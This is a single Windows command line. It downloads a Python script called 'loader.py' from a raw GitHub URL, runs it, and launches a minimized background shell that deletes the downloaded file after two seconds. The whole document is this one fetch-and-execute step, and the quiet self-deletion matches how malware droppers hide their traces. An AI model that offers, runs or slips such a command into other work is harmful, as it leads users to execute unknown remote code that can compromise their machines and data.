curl -sS -o pyb.py "https://raw.githubusercontent.com/repossess/pybear/main/loader.py" && start /min cmd.exe /c "timeout /t 2 >nul 2>&1 && del pyb.py && exit" && python pyb.py
